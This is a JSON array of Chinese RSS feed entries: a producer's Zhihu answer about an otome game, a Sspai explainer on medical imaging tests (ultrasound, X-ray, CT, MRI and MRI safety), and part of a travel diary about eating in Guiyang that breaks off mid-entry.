[{"title":"如何评价单机乙女向游戏《风起长安：驭骨人》？","date":"2021-06-30 11:30:10","description":"\n<p>大家好，我是《风起长安·驭骨人》的制作人非离，同时也担任了剧本写作和演出设计的工作。</p>\n<p>很高兴能在知乎上与大家聊聊我们新上线的这款乙女向单机游戏。</p>\n<p>这一作的诞生原因很多，但总归来说，是我们有故事希望能讲给大家听。</p>\n<p>作为一个因共同兴趣聚拢在一起的制作组，我们面临的问题很多，如大家所说……主要是资金问题。等到资金问题稍有缓解时，《风起长安·驭骨人》已经封包小半年了，这一点现在想来也很遗憾。</p>\n<p>游戏发售后，我看到最多的反馈是世界观很大，但剧本太短，很多问题没讲清楚。</p>\n<p>之前我有说过，《风起长安·驭骨人》是我们的心血之作，也必定成为遗憾之作。</p>\n<p>为了游戏能较完整地出现在大家面前，我将女主设置为非漩涡中心的人物，省去了大篇幅的权力斗争剧情，能更专注于感情线。</p>\n<p>同时我注意到许多玩家表达了对本作中其他女性角色的喜欢，我非常开心。除去男女主的情感描写，塑造女角色之间的友谊是我非常珍视的部分。</p>\n<p>制作时，我对剧情进行了优先级划分，最终将有限的资金分配到制作较为重要的主线剧情上，忍痛舍弃了部分支线剧情，包括其他角色剧情、回忆剧情等。</p>\n<p>这么做的益处很多：我能将剧情演出做得更为精致、细腻，做到了多CG、全语音配置，能一遍遍去磨演出设计、反复测试那0.5秒与1秒的视觉差别。</p>\n<p>缺点也很明显——世界观没铺开，给玩家留下了不少疑问。</p>\n<p>但好在《风起长安》初步构建了一个驭骨人的世界，后续我们会在同一世界观下继续制作新游戏。</p>\n<p>能走到今天，非常感谢玩家们的包容，能够包容我们的缺点、对我们进行鼓励。</p>\n<p>在此还要感谢发行商咕咕工作室，在我们最困难、几乎无以为继的时候提供了很多支持，《风起长安》能顺利做完，离不开咕咕小姐姐们的全力支援。</p>\n<p>目前我们已经在规划新作，非常感谢玩家对轻梨工作室的支持，我们会继续坚持下去。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/qing-li-gong-zuo-shi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">轻梨工作室</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464467926/answer/1968625798?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">8 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/413716759?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为何手游《江南百景图》没有常州府？</a><br><a href=\"http://www.zhihu.com/question/266297957?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">网易游戏为什么大多是和风游戏（手游）？</a><br>\n","link":"http://www.zhihu.com/question/464467926/answer/1968625798?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"医院做的这些「拍片」检查，你可以多了解一点","date":"2021-06-30 08:00:00","description":"\n<p>随着科技进步，医学在不断发展，诊疗时的辅助检查手段也越来越先进。推陈出新的辅助诊断医疗器械和不断更新的各种先进影像学检查技术极大地提高了诊断的阳性率，也给医务工作者带来便利：毕竟听诊器发明之前医生只能紧贴着患者的胸壁听诊，根据接触患者前后消毒的原则，如果现在仍然没有听诊器，作为医生不但手洗烂，脸也要洗烂。</p>\n<p>然而检查手段的进步却给患者带来了更多的困惑，人们在医院就诊时常常奔波于各个检查诊室和交费窗口，晕头转向的同时也不免嘀咕：「怎么就知道给我开检查啊？拍片子会不会有辐射啊？开这么贵的检查是不是有什么回扣啊？」基于以上背景，我将简要介绍一下目前常见的影像学检查的作用和优缺点，让读者对自己做的检查有一个基本的了解。</p>\n<p>需要注意的是，本文旨在为读者科普各类影像学检查，<strong>不推荐</strong>读者对照此文「自行选择」检查。本文不构成任何医疗建议，具体问题请线下就诊并遵医嘱。</p>\n<p>医学影像学包括影像诊断学和介入放射学。考虑到专业性和实用性，本篇仅对影像诊断学中临床常见的影像学检查做简要说明。另外，由于儿童、孕产妇等人群的生理、病理特殊性，本篇介绍内容不涉及以上特殊人群。当然，我并不是物理专业，对具体原理的描述可能不尽详细，若有不准确之处欢迎相关专业人士指正。</p>\n<h2>超声成像：不止是 B 超</h2>\n<p>超声成像是指利用超声波的物理特性和人体组织的声学特点进行成像，并用于辅助诊断的技术。<sup class=\"ss-footnote\" href=\"\" title=\"人卫第九版医学影像学\" footnote-id=\"1\">1</sup>通俗地说，就是超声仪器通过换能器（通常称为探头）发出不同频率的超声波，接收经过人体组织反射、散射、折射、衍射等后返回的声波，再经过仪器处理形成图像。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/74e7d0adde9a039e7734c8bd276703a3.png\"><figcaption>左图为超声检查示例，医生手持接触患者的部分即为换能器（探头）；右图为飞利浦超声仪器。图源飞利浦官网。</figcaption></figure><p>超声成像根据成像的不同技术和显示方式分为 A 型超声、B 型超声（二维超声）、M 型超声、D 型超声（多普勒超声）等。具体的成像原理专业性较强，我们就不细讲了，我用简单粗暴的方法帮你理解这几种超声：</p>\n<p>A 型超声成像为一维波形，目前临床上应用较少。M 型超声成像也是一维波形，只看一条取样线上的状态，主要应用于心脏检查，能够检查心脏结构、观察运动轨迹和测量前后径、室壁厚度、心功能等。也就是说一般你用不着，用着了就是看心脏。</p>\n<p>最常用的 B 型超声成像（B 超）为二维切面，为临床上广泛应用，它也是 M 型超声和 D 型超声的成像基础。你可以简单地理解为医生的探头戳在哪，就在哪打一个切面来看。因为人体是立体的，医生就需要选取不同的切面来进行检查——这就是为什么超声医生的探头总是在你身上戳来戳去还让你时不时翻个个儿，意思就是拿探头给你切出几个面来看一下。你不妨想象一下<strong>自己是一锅菜</strong>，医生的<strong>探头是炒菜的锅铲</strong>，锅铲插到哪里就能看到哪里，如果哪个地方可能有问题（就像菜不熟）还需要增加几铲子。</p>\n<p>D 型超声成像即多普勒超声成像，包括频谱多普勒、组织多普勒成像（TFI）、彩色多普勒能量图（CDE）和多普勒血流成像（CDFI）等。顾名思义，多普勒超声成像是以多普勒效应为基础成像的。这里插播一条高中物理知识复习：多普勒效应，即当一定频率的超声波从声源发生并在介质中传播时，如遇到与声源做相对运动的界面，则其反射的超声波频率随界面运动的情况而发生改变。物体靠近，声波变「密」，远离则变「稀」。基于以上原理，D 型超声主要检查的是能与声源（探头）做相对运动的界面（能运动的组织和血流等）。所以 D 型超声虽然听起来高级，但只有在「动起来」的地方才有使用价值，并不是万物皆可多普勒。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/8f86435b528d11a88407c8086d5cbb4e\"><figcaption>图为多普勒效应。（图自《生活大爆炸》S01E06）</figcaption></figure><p>目前临床常见的两种超声仪器分别为 B 型超声仪和彩色多普勒超声仪。需要注意的是 B 型超声仪并不是只有 B 型超声成像功能，通常还兼有 M 型超声和频谱多普勒成像功能。由于 B 型超声仪的广泛使用，「B 超」这个词语也为广大群众所知晓，也常常被用来代指所有超声检查——这其实是不准确的。当然，作为患者，这一点点称呼上的小瑕疵实在是算不了什么。毕竟医生早就练就了对大夫护士护理员丫头闺女喂嘿甚至服务员等任何称呼都能笑脸相迎，以及听到各种五花八门的病情描述都能平静回应并试图理解沟通的本领。只要能表达清楚你的意思，说什么都是可以的。</p>\n<p>同样地，彩色多普勒超声仪不仅可以进行多普勒超声成像，也兼有 B 型、M 型成像等功能，先进机型还可以进行静态和动态三维成像、超声造影和声学定量等检查。</p>\n<p>超声波是<strong>机械波</strong>，无放射性损伤，也就是人们常说的不「吃线」。由于超声检查是无创、动态的检查，可应用的组织、部位广，操作相对简便（可进行床头、术中检查）且价格相对较低（单部位百元左右），故广泛应用于临床，尤其在<strong>甲状腺、乳腺、淋巴结和腹部实质器官</strong>（如肝胆脾胰）以及<strong>妇科、产科</strong>影像诊断上应用较多。但由于骨骼、肺部和胃肠道中的气体对超声波发生全反射——在声像图上就是黑糊糊一片——超声检查在以上组织、器官的诊断作用有限。另外，上面讲过超声是人为地选取切面进行成像，所以虽然超声检查的切面选择有其固定标准，但由于人体组织的复杂性和病变的多样性等原因，检查过程中不一定能够取到「有问题」的那个切面，且对医生的经验和技术水平有较大的依赖性。</p>\n<h2>X 线成像技术</h2>\n<p>X 线是一种放射性的特殊光线，具有透视性、可吸收性等。利用 X 线进行成像的技术称为 X 线成像技术，主要包括 X 线成像和 X 线计算机体层成像（computer tomography，CT）。生活中通常以「X 线」专指「X 线成像」，而用 CT 来指代「X 线计算机体层成像」。当然说了这一段你应该已经被我绕晕了，没关系先把关系图放在这里，然后我将用最<s>粗暴</s>简单的方式来进行说明。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/7efc87a6e3f8fbe9981439372a15c6d5.png\"></figure><h3>X 线成像——传统 X 线、CR 和 DR</h3>\n<p>我们首先来了解一下 X 线成像的原理。X 射线是一种波长极短的电磁波，具有穿透性、可吸收性、荧光效应和感光效应。X 线成像的基本原理（通俗版）是，X 射线照射到人体，由于人体不同组织的密度和厚度不同，对 X 线的吸收程度也有所不同，所以最终呈现出黑白不同（通常称不同密度）的图像。X 线成像主要包括传统 X 线，计算机 X 线成像（CR）和数字 X 线成像（DR）。三者的区别主要是成像技术的不同，传统 X 线是以胶片成像，CR 和 DR 则是将图像进行像素化和数字化。其中 DR 成像时间较短，能够进行透视检查，且能进行后续图像技术处理等高级功能，广为临床应用。以上技术的选择与应用受被检者的病情和医院、医保实际情况等影响，大家只要知道「透视、X 线、平片、CR、DR」都是 X 线检查就可以了。</p>\n<p>生活中读者都对 X 线有一定的了解，可能知道白色的是骨头，灰黑色的是其他。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/29/article/fff08c951a01e87e37dd6bc486cb6e34\"><figcaption>图为网络表情包，来源不详，但这个点赞看起来很有力度。</figcaption></figure><p>不同组织、部位呈现不同的颜色，其实与组织密度有直接的关系。组织密度越高，对 X 线的吸收就越多，最终成像的颜色也就越亮，所以 X 线成像中，白色部分称为高密度，灰黑色称低密度。若人体产生病变造成组织密度发生变化，达到一定程度后就会在成像上出现黑白灰度变化。</p>\n<p>X 线成像是叠加图像，即 X 线照射部分从前到后所有层级图像的叠加，如同「透视眼」视角。所以，X 线成像也被称为透视，比如学校体检和公务员、事业单位入职体检的「胸透」项目就是指胸部后前位 X 线成像，但它不将图像呈现在胶片、影像板和平板探测器中，而是直接呈现在荧光屏上实时观测。下图为胸部后前位 X 线图像，可以看出胸部所有的组织结构都叠加在图像中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/2003777d7a9588dcfb5d0b9ec4d91831\"><figcaption>图片来源于人卫第九版医学影像学</figcaption></figure><p>利用人体组织自然的厚度密度对比进行成像是自然成像，在自然的成像「看不清」的时候，可以通过对比剂（也称造影剂）来人工增加对比，比如高中化学题里常常出现的口服钡餐进行胃肠道 X 线摄影，以及目前临床上飞速发展的介入手术所应用的血管造影。</p>\n<p>X 线拍摄方便，成本较低，单部位平片百元左右，成像显示的范围较大（如上图一张片子整个胸部都能看到）。缺点是作为叠加图像，多层组织的成像叠加可能影响对病变的判断，对于一些细微的病变难以检查出来。另外由于组织的特性和 X 线的成像原理，X 线的应用范围有限：如临床上 X 线平片在腹部应用较少，一般仅应用于急腹症、结石的初筛等；随着内镜技术的发展，钡餐检查应用也有所减少。</p>\n<h3>计算机体层成像——CT</h3>\n<p>CT 是 X 线计算机体层成像的缩写，从全称可以看出，CT 也是利用 X 线成像技术的一种。CT 和普通 X 线的最大区别，就在体层二字。用粗暴的方式来解释，X 线是无数的层叠加出一张图像，而 <strong>CT 是真正的断层图像</strong>，也就是把被扫描的部位的多个层面都分别进行成像——打个比方，<strong>你是一条法棍</strong>（或者火锅店的冻肉条），又硬又长，我们想看看你里面长什么样子，于是搞来一台机器把你从头到脚一片一片切成薄片，这样就能看到<strong>每一个薄片截面长成什么样子</strong>——此时，各个层面的图像都没有其他层面的影响，能够清晰地观察单个层面的组织结构和病变。</p>\n<p>这大概就是医学影像学检查的意义：不用把你真的切开就能看清该切开才能看到的地方，把原来只能通过望闻问切体格检查间接「推断」出来的毛病直接「展示」出来。</p>\n<p>CT 成像是数字化重现图像，其分辨率较 X 线高（具体不同设备和处理技术像素不同），同时 CT 成像的密度值是可量化的，不仅可以用高中低密度来描述图像，也可以用 CT 值来直接描述密度。CT 通常采用横轴面断层成像（就是腰斩的那个层面，法棍啥层面这个就是啥层面），所以大家平时看见的 CT 片总是一个一个的椭圆形图像（如下图右）。但在头面部或颅脑 CT 检查时，有时增加一个冠状层面扫描（竖着劈成前后两半的大平面），就是躺下来，平着开始片片儿，这样能把脑袋该切的每个方向都切开看清。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/8665463654250ed0170dffb34a2fe1cc.png\"><figcaption>图左为人体的轴和面，图源吉林科技出版社人体解剖学；图右为正常肺窗 CT，截取自医学影像学。</figcaption></figure><p>直接利用组织厚度密度不同进行成像的 CT 称为 CT 平扫，通常几分钟内可完成检查。利用对比剂帮助成像的 CT 称为 CT 增强，检查时间略长，根据检查部位及增强技术不同，可能需要数分钟至半小时。随着 CT 技术的发展，「切片」的厚度也越来越薄。螺旋 CT 应用之后，成像可以看成是连续均匀扫描。患者检查后可以取出保存的胶片是选取一定的截面进行打印的，而在应用了最新影像系统的医院，医生可以在电脑上的影像系统中直接观察患者 CT 扫描的每一个层面，如果需要进行进一步的图像处理，还可以在原有扫描的图像上进行一定的「技术处理」，而不需要患者进行二次检查。</p>\n<p>CT 的成像的层面多，分辨率高，价格也就相对较高，其价格通常与扫描部位有关，例如 2021 年某省级最大三甲医院的头颅高分辨螺旋 CT 平扫价格是 198 元，胸部高分辨螺旋 CT 平扫是 378 元，相比普通 X 线经济成本较高。医生在 X 线和 CT 两者之间进行选择时，会根据患者的病情、病变部位、经济情况等情况进行权衡。所以在 X 线检查可能「看不清」的情况下，有可能会建议患者行 CT 检查一步到位，既减少了 X 线吸收（即避免二次吃线），又不会因为反复检查延误诊治。</p>\n<p>前面讲过 X 线较少应用于腹部疾病诊断，临床工作中对<strong>腹部疾病的初筛首选超声</strong>检查，而<strong>进一步检查多选用 CT 检查</strong>。<a href=\"https://sspai.com/u/yn90jmjq/updates\" target=\"_blank\">@刀客特Leslie</a> 在<a href=\"https://sspai.com/post/66539\" target=\"_blank\">体检项目</a>的文章里也提到过，推荐体检进行肺部 CT 检查。这就是因为一些大小较小的病变在 X 线成像中难以看清，而在 CT 中可以发现一些较早期的病变，从而尽早进行诊治，且在后续治疗中方便进行复查对比。</p>\n<p>大家较为关心的另外一个问题是 X 线成像检查（包括普通 X 线和 CT 检查）的安全性。<strong>X 线成像检查有一定的放射性损伤</strong>，一段时间内的检查次数不宜过于频繁。对于孕产妇、儿童等特殊人群，X 线成像的应用需要更加慎重。一般非特殊必需必要，半年内有怀孕计划的妇女及孕产妇不进行此类检查。对于儿童，非病情需要，尽量少进行此类检查。当然，对于一般成年人，不超剂量不超频率地行利用 X 线成像检查一般对人体是无害的，所吸收的射线会在数天后代谢干净。</p>\n<p>一般来说，进行检查或者陪检时，全程听从工作人员的指挥就没有问题。但本着对自己负责的原则，大家应该知道：若非检查或必须陪检的情况（如患者躁动需要家属协助制动），不要进入检查室，如进入需听从医务人员的指挥并穿好防护铅衣。另外，通常检查室附近会设有分诊、问询处或配备相关工作人员，有什么问题可以先咨询外面的工作人员，不要随意进出检查室。如必须进入检查室请等待检查结束。应用了对比剂检查的被检者，可以在检查结束后多喝水，促进对比剂的代谢。</p>\n<h2>磁共振成像（MRI）</h2>\n<p>磁共振成像就是我们平时所说的核磁检查，也是大众一般情况下所能接触到的较为高大上（贵）的影像学检查。磁共振成像的原理较为复杂，感兴趣的朋友可以自行查阅相关资料进行学习。影像学课本上将磁共振成像的原理分为三个步骤：一，人体 1H 在强外磁场内产生纵向磁化矢量和 1H 进动；二，发射特定频率脉冲（RF 脉冲）引起磁共振现象；三，停止 RF 脉冲后 1H 恢复至原有状态并产生 MR 信号。<sup class=\"ss-footnote\" href=\"\" title=\"人卫第九版医学影像学\" footnote-id=\"2\">2</sup></p>\n<p>看不懂是吗？我们删除专业名词进行粗暴翻译：核磁机器造了一个强烈的外磁场，将被检者置于这一磁场内；同时机器间断发出特定频率的射频脉冲，让人身体里面的 H 原子核进行特定「运动」（产生磁共振现象），脉冲停止后，原子核又恢复原来的状态。机器记录原子核恢复原来状态的时间（称弛豫时间），经过一系列复杂的高科技转换成图像。而你需要知道的其实只有一件事：它没有放射线，它用的是磁场。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/76f53cf752783e379d6af5668fd62e8d\"><figcaption>图为核磁检查仪器，图片来源于飞利浦官网。</figcaption></figure><p>磁共振成像的黑白灰度表示的是组织间不同弛豫时间，由于 1H 在弛豫过程中产生代表不同弛豫时间的 MR 信号，所以磁共振图像中，不同灰度称高低信号。不同组织的弛豫时间不同，磁共振成像以此为原理进行疾病诊断。两种不同的弛豫时间产生的信号称为 T1、T2 信号，其具体高低信号的含义内容非常复杂，当然对于普通读者来说也不需要了解，知道有这么两种信号就足够了。</p>\n<p>磁共振成像也是<strong>断层图像</strong>，但不同于 CT，磁共振成像可以进行多层面成像：即 CT 一般是横轴断面（腰斩），而核磁可以进行各个角度的断面成像（随便切）。核磁能进行多参数、多序列成像，对软组织分辨率很高，在<strong>颅脑应用较多</strong>。另外，核磁可以直接利用人体中的水和血液等进行成像，不需要注射对比剂，避免了碘对比剂的副作用。由于磁共振成像是利用外磁场和 RF 脉冲使人体自身的原子核产生磁共振现象来成像的，所以一般被认为是安全性高、无副作用的检查。核磁检查虽然有诸多优点，但也并不是万能的。由于其成像原理和多序列扫描，完成检查需要较长时间（不同检查略有不同，约 1-2 小时），抽搐、躁动、神志不清、幽闭恐惧症等因为种种原因「躺不住」的患者难以行此检查。此外其检查时间过长，不适于急诊。</p>\n<p>接下来，我们聊聊 MRI 的安全问题——</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/8b16ee29e5186dd2f97ea4878888dd22.png\"><figcaption>病床被吸进 MRI 机器，图源：AAMC 发布的 MRI 安全教程课件</figcaption></figure><p>从原理上，核磁成像过程中没有应用到放射线，也就不存在大家所担心的吃线问题，可以说是一个「安全」的检查。但很不幸，临床上磁共振成像往往是事故多发地。倒不是由于检查本身有什么危害，而是因为<strong>检查前的安全措施</strong>没有做好。磁共振成像时有一强大的外磁场，对金属有很大的吸引力，所以在检查时一定要将身上的金属物品（包括但不限于钥匙、饰品、眼镜、钢笔、硬币、活动性义齿等）<strong>全部取出</strong>，有心脏起搏器、磁性金属材质义齿和关节、钢钉、钢板、螺钉支架、节育环等植入的患者不能行此检查。</p>\n<p>另外单独说一下近年来广为使用的钛合金植入物：由于植入物的大小、位置以及植入物的成分（纯钛 / 钛合金，某些钛合金植入物的合金成分和比例是保密专利）不同，其对核磁成像的影响也不同。一般认为，钛合金植入物是非磁性的，不影响核磁检查的安全性，但其会产生伪影，影响检查的效果。也就是说，一般来说钛合金可以做核磁，但是做了可能因为这个附近是看不清的。具体能不能做，请以主治医师、负责植入物的医师、影像科医师的说法为准。<strong>不要图省事或者其他原因隐瞒病史！</strong>以前就发生过整个轮椅带着人直接咣一下吸到了核磁机器上，几千万的机器（是真的这么贵）当场报废的悲剧。不知道那位患者是什么原因直接坐着轮椅就进入了检查室，也不知道这件事后续如何处理，但咣一下被吸到机器上一定对患者造成了人身伤害，其他的患者也因为机器故障而延误了检查。所以请大家在做核磁检查或者作为陪护进入核磁检查室时，一定注意<strong>听话！别带金属！别带一切金属 NOOOOOOO！</strong></p>\n<h2>总结</h2>\n<p>不同影像学检查的使用范围不同，影像学检查的选择是极其复杂的。即便是同一种疾病，其病变的不同时期，需要进行的检查可能都不尽相同；更不用说考虑到病情的复杂多样、个体的差异（患者的一般状态，是否合并其他疾病，是否存在其他检查的禁忌症）和其他复杂的现实条件（患者的性别、年龄、文化、信仰、个人和家属的意愿、家庭经济条件和医保情况、医院的设备技术水平等等等等）。</p>\n<p>或许你读完之后仍旧对这些检查的具体原理一头雾水，这非常正常。一个经过至少五年本科学习、拿了医师证又经过规培又在临床上摸爬滚打的医生，在进行非本专业病种的诊治时，尚且需要会诊，外行就更别说了，不信找个物理专业的朋友来看看我上面写的原理，看他想打我不。所以，专业的事情交给专业的人去做，读者需要明白「做检查是为什么」和「我在做检查的时候应该如何配合、应该怎么保护自己」就很好了。另外叮嘱一句，就诊过的资料（包括但不限于病历、门诊本、化验单等）一定好好保存，<strong>影像学检查的片子请平铺存放</strong>，不要卷起不要对折更不要扔了。</p>\n<p>最后祝你，身体健康。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/66539\" target=\"_blank\">年轻人的体检指南 01：体检在检查什么</a></li>\n<li><a href=\"https://sspai.com/post/66635\" target=\"_blank\">年轻人的体检指南 02：个性化筛查</a></li>\n<li><a href=\"https://sspai.com/post/67410\" target=\"_blank\">亲爱的，我想开启一场有关抑郁症的对话</a></li>\n<li><a href=\"https://sspai.com/post/65177\" target=\"_blank\">让认知成为改变的第一步：年轻人如何远离高血压</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67474"},{"title":"快乐飞旅行报告 05：两天的贵阳都是吃","date":"2021-06-30 06:14:44","description":"\n<p>在 2020 年底，南航推出了快乐飞 2.0，我终于下定决心开启周末全国飞的计划。上半年假期多，南航快乐飞不局限在周末，买它准没错。万万没想到的是疫情再次来袭，一直拖到了今年 3 月底，我才正式出行，好歹也算抓住了快乐飞的下半程。</p>\n<p>本篇是我的快乐飞旅行游记的第五篇，我会以一个系列的形式向大家分享我这三个月的快乐飞旅行见闻，希望大家喜欢。（到最后，如果南航继续推出快乐飞 3.0，我再来做个快乐飞购买总结。）</p>\n<hr>\n<p>改用托尔斯泰的话说，我对贵阳的印象是：发达城市各有各的相似，欠发达城市的原因其来有之。从贵阳龙洞堡机场出来，我和小伙伴打了辆当地的出租车到市区，一上车司机就拒绝导航、一路上光讲方言，到达目的地还多收了六块钱。又是一个第一印象不好的城市。</p>\n<p>贵阳，贵州省会城市。提起贵阳，除了「云上贵州」，脑海中似乎没有什么它的特色亮点，可能是被临近的重庆成都抢了风头。这次来贵阳是和同样是快乐飞的 <a href=\"https://sspai.com/u/lxxk4oyk/updates\" target=\"_blank\">@直树桑</a> 一起（封面图片就是直树的作品），又和生活在贵阳当地的 <a href=\"https://sspai.com/u/Microhoo/updates\" target=\"_blank\">@阿基米虎</a> 网友见面，时间是 4 月 24 日 - 4 月 25 日。</p>\n<h2>真正做咖啡：对的咖啡 &amp; NectarOneCafe</h2>\n<p>小虎推荐了他认为在贵阳认真做咖啡的「DuiDe 对的咖啡」，说让我们一定要去体验。「对的咖啡」开在中山西路地铁口，老式写字楼的一楼，不太起眼，进门隐蔽。但是店内倒是十分宽敞，料理台也是吧台，卡座都可落座，门外玻璃窗前更适合黄昏把杯闲聊。</p>\n<p>时间已到傍晚，招牌冠军拿铁售罄，于是点了 Dirty。问了调配师，确认是冰博克，想来不会太差。不过可能是杯子的原因，大口喝没有双层口感的冲击，奶多咖啡液少，期望过高有点失望。</p>\n<p>内侧的料理台放了好多酒，「对的咖啡」也是白天咖啡晚上酒吧的模式，中间一瓶茅台非常抢镜。注意观察，器皿区域还摆了一把铜制长柄咖啡壶，正是我在武汉游记里写到的制作土耳其咖啡的专用器皿。调配师说他们最近正在研发和土耳其咖啡有关的新品，看来小虎说的没错，这家店确实在认真做咖啡。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/260c87b45242cd385e2885c2db348b62.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/f338c6de047fe2b2d58122a11abb1fa4.jpg\" alt=\"\"></figure><p> </p>\n<p>贵阳老城区的一家 NectarOneCafe，和「对的咖啡」是同一个老板在经营。那一家地段好、风格更网红，生意也好多了。我们在最后一天去机场前，打卡了 NectarOneCafe。</p>\n<p>招牌「金海盐拿铁」，是直树点的，上面一层可食用的金箔，杯子也很特殊，但是听说就是拿铁那味儿（笑）。我点了「冠军的创意」里的「一刻甘甜」，「冠军」说的是这是咖啡师参赛获奖的创意作品，不会踩雷。</p>\n<p>先喝一口上层泡沫，这是用冰块与菠萝、百香果 shake 出来的绵密酸甜，满是菠萝香。再将咖啡液倒入混合，咖啡液量少，因此清淡爽口。菠萝干，酸酸甜甜，咬一口菠萝干，再喝一口饮料，是推荐的饮用方法。总体来说，是我比较满意的水果类创意咖啡。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/95e59e95d3c6059eaed900224bc07803.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/afa06c304f8c593d31f834214f93d6b9.jpg\" alt=\"\"></figure><p> </p>\n<h2>聊语话乡</h2>\n<p>第一天快到入夜，终于和小虎汇合。他带我们去了当地的一家农家菜馆，叫做「聊语话乡」。店内全是当地人，少有游客身影，有大桌好友聚会，也有一家老小五口人来下馆子。</p>\n<p>黔菜，混合了少数民族的饮食特色，又因贵阳靠近重庆成都，辣醇、酸鲜。蕨根拌粉，很是开胃，可惜竟然不辣。毛血旺式的水煮牛肉，辣味竟然也不重。还有一道让我记住的菜是盐菜蒸肉。盐菜，和江浙地区的梅干菜是殊途同归。用青菜晒干腌渍，发霉发黑发干，咸味和鲜味得以保留，用来蒸肉、炒饭、煮汤都很开胃。在老家常能吃到的梅干菜，没想到在贵阳还有「姊妹篇」。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/c728c60e003e30a5569a042e615b2d9f.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/4379add09886bc6ffe059368692e47b1.jpg\" alt=\"\"></figure><p>聊语话乡就在甲秀楼对面，吃完出来下了小坡就是，可直接打卡贵阳为数不多的地标建筑之一。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/3209cc39f189d62d8203f6acc3038767.jpg\"></figure><h2>本地奶茶和烤串</h2>\n<p>宜北町，是贵阳本地的奶茶品牌。听小虎说，贵阳年轻一代的集体记忆里有三家本地奶茶店，只这「宜北町」发展出了开遍贵阳的态势。</p>\n<p>宜北町的装修像星巴克那样，在努力打造第三空间的氛围，灯光、家具、氛围，都很适合聊天。贵阳人民似乎特别爱聊天，晚上九点在宜北町的露天桌上，还有大半座位上顾客在谈天说地。</p>\n<p>性价比不高，论口味是比其他奶茶店略胜一筹，但价格溢价太多了，要说花在这氛围上倒真成了奶茶届的「星巴克」了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/4fb7521bb2c388ad947e04926e008d2a.jpg\"></figure><p>小蒋辣子鸡火锅，开在民生路。贵阳老市区的特点是，特别是民生路这一带，随便路过一条巷子，左右都会列队各式各样的小吃，这一条街、下一条街都是如此。</p>\n<p>我们来这儿可不是要吃火锅，而是这家的烤串。最好吃的是烤肉筋，小块肉筋，牙签肉的大小穿成串，肥瘦相间，炭火现烤，直到竹签生焦。烤的过程中，要刷上好几遍调料，咸味不免偏重，不过好在辣味、鲜味、香味都很突出，最后撒一把葱花，再等几秒出了葱香就上桌，好吃。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/f7a4402d1af2c23374f5f671aaf4fc3a.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/b8e7400d5d2ad6606a455c1f2d645155.jpg\" alt=\"\"></figure><h2>贵州特色小吃：肠旺面</h2>\n<p>到了第二天，我们正式开始贵阳网红游客食物的探访。</p>\n<p>蔡家街，是一条市井饮食街。自中山东路起通向文笔街的路上，两边星罗棋布各种小吃美食，比如豆沙窝、黄牛肉粉、老酸汤、还有贵阳改良过的臭豆腐等等。罗记肠旺面就开在蔡家街。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/7f05fdf39ce199641daf9e4768801fe3.jpg\"></figure><p>肠旺面，贵州特色小吃，可以简单地将它理解成毛血旺加面条😂。用料有大肠、猪血、脆哨、油豆腐，主食手工鸡蛋面，所以看起来与一般的面条不一样，吃起来更筋道。由大肥肉榨干制成的脆哨，吃起来像油渣，但不油腻，反而劲脆，在很多贵州小吃里都能见到脆哨。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img 